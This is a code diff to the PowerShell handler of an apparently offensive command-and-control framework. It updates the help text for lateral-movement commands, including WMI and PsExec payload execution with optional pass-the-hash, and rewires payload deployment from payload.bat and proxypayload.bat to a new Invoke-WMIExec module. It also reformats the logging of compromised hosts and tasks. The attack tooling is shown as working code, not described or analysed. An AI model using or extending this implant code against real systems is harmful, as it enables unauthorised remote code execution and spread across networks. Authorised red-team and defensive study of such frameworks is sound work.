@@ -205,14 +205,14 @@ function Implant-Handler
         Write-Host " Invoke-Sniffer -OutputFile C:\Temp\Output.txt -MaxSize 50MB -LocalIP 10.10.10.10" -ForegroundColor Green
         Write-Host " Invoke-SqlQuery -sqlServer 10.0.0.1 -User sa -Pass sa -Query 'SELECT @@VERSION'" -ForegroundColor Green
         Write-Host " Invoke-RunAs -cmd 'powershell.exe' -args 'start-service -name WinRM' -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
-        Write-Host " Invoke-RunAsPayload -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
-        Write-Host " Invoke-RunAsProxyPayload -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
-        write-host " Invoke-WMICommand -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>' -command <cmd>" -ForegroundColor Green
-        write-host " Invoke-WMIPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>'" -ForegroundColor Green
-        write-host " Invoke-PsExecPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>'" -ForegroundColor Green
-        write-host " Invoke-PsExecProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>'" -ForegroundColor Green
-        write-host " Invoke-WMIDaisyPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>'" -ForegroundColor Green
-        write-host " Invoke-WMIProxyPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>'" -ForegroundColor Green
+        Write-Host " Invoke-RunAsPayload -Domain <dom> -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
+        Write-Host " Invoke-RunAsProxyPayload -Domain <dom> -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
+        write-host " Invoke-WMIExec -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional> -command <cmd>" -ForegroundColor Green
+        write-host " Invoke-WMIPayload -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
+        write-host " Invoke-PsExecPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
+        write-host " Invoke-PsExecProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
+        write-host " Invoke-WMIProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
+        #write-host " Invoke-WMIDaisyPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>'" -ForegroundColor Green
         #write-host " EnableWinRM | DisableWinRM -computer <dns/ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
         write-host " Invoke-WinRMSession -IPAddress <ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
         write-host `n "Credentials / Tokens / Local Hashes (Must be SYSTEM): " -ForegroundColor Green
@@ -665,6 +665,10 @@ param
 [string] $psrandomuri
 )
 # alias list
+            if ($pscommand.ToLower().StartsWith('load-module'))
+            { 
+                $pscommand = $pscommand -replace "load-module","loadmodule"
+            }
             if ($pscommand)
             { 
                 CheckModuleLoaded "Implant-Core.ps1" $psrandomuri
@@ -766,9 +770,9 @@ param
             if ($pscommand.ToLower().StartsWith('invoke-wmiproxypayload'))
             {
                 if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
-                    CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
+                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
                     $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
-                    $pscommand = $pscommand -replace 'Invoke-WMIProxyPayload', 'Invoke-WMICommand'
+                    $pscommand = $pscommand -replace 'Invoke-WMIProxyPayload', 'Invoke-WMIExec'
                     $pscommand = $pscommand + " -command '$proxypayload'"
                 } else {
                     write-host "Need to run CreateProxyPayload first"
@@ -790,9 +794,9 @@ param
             if ($pscommand.ToLower().StartsWith('invoke-wmipayload'))
             {
                 if (Test-Path "$FolderPath\payloads\payload.bat"){ 
-                    CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
+                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
                     $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
-                    $pscommand = $pscommand -replace 'Invoke-WMIPayload', 'Invoke-WMICommand'
+                    $pscommand = $pscommand -replace 'Invoke-WMIPayload', 'Invoke-WMIExec'
                     $pscommand = $pscommand + " -command '$payload'"
                 } else {
                     write-host "Can't find the payload.bat file, run CreatePayload first"
@@ -1278,13 +1282,13 @@ param
                $ImplantsArray = @()
                foreach ($implantres in $allresults) {                  
                     $ImplantLog = New-Object PSObject | Select ImplantID, RandomURI, User, Hostname, IPAddress, FirstSeen, LastSeen, PID, Arch, Domain, Sleep
-		            $ImplantLog.ImplantID = $implantres.ImplantID;
-		            $ImplantLog.RandomURI = $implantres.RandomURI;
-		            $ImplantLog.User = $implantres.User;
-		            $ImplantLog.Hostname = $implantres.Hostname;
-		            $ImplantLog.IPAddress = $implantres.IPAddress;
-		            $ImplantLog.FirstSeen = $implantres.FirstSeen;
-		            $ImplantLog.LastSeen = $implantres.LastSeen;
+                    $ImplantLog.ImplantID = $implantres.ImplantID;
+                    $ImplantLog.RandomURI = $implantres.RandomURI;
+                    $ImplantLog.User = $implantres.User;
+                    $ImplantLog.Hostname = $implantres.Hostname;
+                    $ImplantLog.IPAddress = $implantres.IPAddress;
+                    $ImplantLog.FirstSeen = $implantres.FirstSeen;
+                    $ImplantLog.LastSeen = $implantres.LastSeen;
                     $ImplantLog.PID = $implantres.PID;
                     $ImplantLog.Arch = $implantres.Arch;
                     $ImplantLog.Domain = $implantres.Domain;
@@ -1298,9 +1302,9 @@ param
                $TasksArray = @()
                foreach ($task in $allresults) {                  
                     $ImplantTask = New-Object PSObject | Select TaskID, Timestamp, RandomURI, Command, Output
-		            $ImplantTask.TaskID = $task.CompletedTaskID;
+                    $ImplantTask.TaskID = $task.CompletedTaskID;
                     $ImplantTask.Timestamp = $task.TaskID;
-		            $ImplantTask.RandomURI = $task.RandomURI;
+                    $ImplantTask.RandomURI = $task.RandomURI;
                     $ImplantTask.Command = $task.Command;
                     $ImplantTask.Output = $task.Output;
                     $TasksArray += $ImplantTask
